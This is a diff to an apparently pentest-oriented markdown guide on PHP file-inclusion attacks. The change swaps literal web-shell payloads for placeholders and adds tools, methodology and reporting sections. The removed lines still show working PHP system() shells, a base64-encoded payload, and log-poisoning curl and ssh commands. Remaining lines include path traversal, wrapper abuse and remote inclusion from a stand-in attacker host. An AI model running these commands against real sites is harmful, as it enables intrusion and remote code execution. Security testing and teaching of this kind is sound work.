@@ -12,7 +12,15 @@ origin: AI Threat Hunting
 - Dynamic content loading based on user input, URL patterns like `/index.php?page=about`
 - Error messages reveal file system paths
 
-## LFI Detection
+## Tools
+
+- `curl` — manual path traversal probing and wrapper testing
+- `ffuf` — automated traversal depth and path fuzzing
+- `php_filter_chain_generator.py` — PHP filter chain RCE without file write (synacktiv tool)
+
+## Methodology
+
+### 1. LFI Detection
 
 ### Basic Path Traversal
 ```
@@ -75,13 +83,13 @@ echo "BASE64_OUTPUT" | base64 -d
 
 ### php://input — Code Execution (requires allow_url_include=On)
 ```bash
-curl -X POST "http://target/index.php?page=php://input" --data "<?php system('id'); ?>"
+curl -X POST "http://target/index.php?page=php://input" --data "PAYLOAD: php system('id')"
 ```
 
 ### data:// — Code Execution (requires allow_url_include=On)
 ```
-?page=data://text/plain,<?php system('id'); ?>
-?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOyA/Pg==
+?page=data://text/plain,PAYLOAD: php system('id')
+?page=data://text/plain;base64,BASE64_ENCODED_PHP_SYSTEM_CALL
 ```
 
 ### expect:// (rare, requires expect extension)
@@ -91,7 +99,7 @@ curl -X POST "http://target/index.php?page=php://input" --data "<?php system('id
 
 ### zip:// and phar:// — Via File Upload
 ```
-echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php
+echo 'PAYLOAD: php system($_GET["cmd"])' > shell.php && zip shell.zip shell.php
 ?page=zip://uploads/shell.zip%23shell.php
 ?page=phar://uploads/shell.phar/shell.php
 ```
@@ -101,17 +109,17 @@ echo '<?php system($_GET["cmd"]); ?>' > shell.php && zip shell.zip shell.php
 ### Log Poisoning
 ```bash
 # Inject PHP into access log via User-Agent
-curl -A "<?php system(\$_GET['cmd']); ?>" http://target/
+curl -A "PAYLOAD: php system($_GET['cmd'])" http://target/
 # Include the log file
 ?page=../../../var/log/apache2/access.log&cmd=id
 # Alt: SSH log injection
-ssh "<?php system(\$_GET['cmd']); ?>"@target
+ssh "PAYLOAD: php system($_GET['cmd'])"@target
 ?page=../../../var/log/auth.log&cmd=id
 ```
 
 ### /proc/self/environ
 ```
-curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ"
+curl -A "PAYLOAD: php system('id')" "http://target/?page=../../../proc/self/environ"
 ```
 
 ### Session File Inclusion
@@ -123,17 +131,26 @@ curl -A "<?php system('id'); ?>" "http://target/?page=../../../proc/self/environ
 
 ### PHP Filter Chain (No File Write)
 ```
-python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
+python3 php_filter_chain_generator.py --chain 'PAYLOAD: php system("id")'
 # Use output as inclusion parameter value
 ```
 
 ## Remote File Inclusion (requires allow_url_include=On)
 
 ```
-?page=http://attacker.example/shell.txt    # shell.txt: <?php system($_GET['cmd']); ?>
+?page=http://attacker.example/shell.txt    # shell.txt: PAYLOAD: php system($_GET['cmd'])
 ?page=http://attacker.example/shell.txt%00 # null byte to strip appended extension
 ?page=\\attacker.example\share\shell.php   # SMB (Windows, no allow_url_include needed)
 ```
+
+## What to Record
+
+- Vulnerable parameter and endpoint
+- Traversal depth required (how many `../`)
+- Encoding/bypass technique needed (null byte, double encoding, etc.)
+- Files successfully read and their content (redact secrets in report)
+- RCE method if achieved (log poisoning, PHP wrappers, filter chains)
+- Severity: Critical (RCE), High (sensitive file read), Medium (limited file read)
 
 ## Extended Resources
 
